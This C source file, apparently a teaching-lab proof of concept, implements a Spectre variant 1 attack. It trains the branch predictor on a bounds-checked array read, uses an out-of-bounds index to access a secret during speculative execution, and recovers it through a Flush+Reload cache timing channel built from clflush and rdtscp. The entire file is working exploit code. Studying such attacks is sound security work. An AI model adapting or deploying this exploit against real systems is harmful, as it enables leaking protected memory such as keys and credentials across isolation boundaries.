#include <emmintrin.h>
#include <x86intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define DELTA 1024
#define CACHE_HIT_THRESHOLD 350

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t temp = 0;
char *secret = "Some secret";
uint8_t array[256*4096];
static int scores[256];

void flushSideChannel()
{
	int i;
	for(int i=0; i<256; i++)
		array[i*4096 + DELTA] = 1;

	for(int i=0; i<256; i++)
		_mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
	int junk=0;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	int i;
	for(i = 1; i < 256; i++)
	{
		addr = &array[i*4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk) - time1;
		if (time2 <= CACHE_HIT_THRESHOLD)
		{
			printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
			printf("The Secret = %d.\n",i);
			scores[i]++;
		}
	}
}

uint8_t restrictedAccess(size_t x)
{
	if (x < buffer_size) 
	{
		return buffer[x];
	} 
	else  
	{
		return 0;
	}
}

void spectreAttack(size_t larger_x)
{
	int i;
	uint8_t s;
	// Train the CPU to take the true branch inside restrictedAccess().
	// Flush buffer_size and array[] from the cache.
	for(i = 0; i < 256; i++) 
	{ 
		_mm_clflush(&array[i*4096 + DELTA]); 
	}

	for(i = 0; i < 10; i++) 
	{ 
		_mm_clflush(&buffer_size);
		restrictedAccess(i);
	}

	_mm_clflush(&buffer_size);

	for(i = 0; i < 256; i++) 
	{ 
		_mm_clflush(&array[i*4096 + DELTA]); 
	}
	// Ask restrictedAccess() to return the secret in out-of-order execution.
	s = restrictedAccess(larger_x);
	array[s*4096 + DELTA] += 88;
}

int main()
{
	int i;
	
	size_t larger_x = (size_t)(secret - (char*)buffer);

	flushSideChannel();
	for(i = 0; i < 256; i++)
	{
		scores[i] = 0;
	}

	for(i = 0; i < 10; i++)
	{
		spectreAttack(larger_x);
		reloadSideChannel();
		flushSideChannel();
	}

	int max = 0;
	for (i = 0; i < 256; i++)
	{
		if(scores[max] < scores[i])
			max = i;
	}
	printf("Reading secret value at %p = ", (void*)larger_x);
	printf("The secret value is %d\n", max);
	printf("The number of hits is %d\n", scores[max]);
	return (0);
}